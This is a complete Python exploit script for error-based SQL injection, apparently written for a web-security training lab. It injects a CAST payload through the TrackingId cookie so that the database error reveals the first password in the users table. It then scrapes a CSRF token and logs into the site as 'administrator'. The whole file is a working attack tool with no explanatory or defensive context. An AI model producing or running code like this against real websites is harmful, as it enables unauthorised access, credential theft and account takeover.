#!/usr/bin/env python3

import requests
import sys
import re
import urllib3
import urllib.parse
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


TRACKING_ID = ""
SESSION = "4atUUSQ9Usd0dLAfyHfHB48Jpeh0xIaX"
TIMEOUT = 10
MAX_LENGTH = 50
PATH = "/product?productId=12"

# injection request
def inject(url, payload):
    encoded = urllib.parse.quote(payload)
    cookies = {'TrackingId' : TRACKING_ID + encoded, 'session': SESSION}
    try:
        r = requests.get(url + PATH, cookies=cookies, verify=False, timeout=TIMEOUT)
        return r
    except requests.exceptions.Timeout:
        print("\n[-] Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"\n[-] Request error: {e}")
        return None

# extract admin password
def extract_password(url):
    payload = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -"

    r = inject(url, payload)
    match = re.search(r'invalid input syntax for type integer: "([^"]+)"', r.text)
    if match:
        admin_pass = match.group(1)
        print("[+] Admin password discovered:", admin_pass)
        return admin_pass
    return None

# grab csrf token
def get_csrf_token(s, url):
    r = s.get(url + "/login", verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"]
    return csrf

# login as admin
def admin_login(url, admin_pass):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": "administrator", "password": admin_pass}
    r = s.post(url + "/login", data=data, verify=False)
    res = r.text
    if "Log out" in res:
        return True
    return False    

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit()

    admin_pass = extract_password(url)

    if not admin_pass:
        print("[-] No administrator password found")
        sys.exit()

    print("[+] Success")  

    s = requests.session()

    if admin_login(url, admin_pass):
        print("[+] Successfully logged in")
    else:
        print("[-] Login failed")      